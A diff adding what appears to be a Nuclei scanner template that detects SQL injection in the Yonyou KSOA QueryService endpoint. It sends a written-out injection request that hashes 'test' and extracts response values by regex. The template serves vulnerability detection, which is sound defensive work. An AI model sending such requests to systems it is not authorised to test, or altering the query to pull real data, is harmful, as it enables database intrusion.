@@ -1,0 +1,42 @@
+id: yonyou-ksoa-sqli
+info:
+  name: Yonyou KSOA QueryService SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou KSOA QueryService is vulnerable to an SQL Injection vulnerability which allows attackers to obtain sensitive database information.
+  reference:
+    - https://fofa.info
+  tags: sql-injection
+  classification:
+    cvss-score: 10
+
+variables:
+  sql_payload: "select%20sys.fn_varbintohexstr(hashbytes('md5','test'))"
+
+http:
+  - raw:
+      - |
+        GET /servlet/com.sksoft.bill.QueryService?service=query&content=select%20sys.fn_varbintohexstr(hashbytes('md5','test')) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "0x098f6bcd4621d373cade4e832627b4f6"
+  - raw:
+      - |
+        GET /servlet/com.sksoft.bill.QueryService?service=query&content={{sql_payload}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status: [200]
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<d>(.*?)</d>"
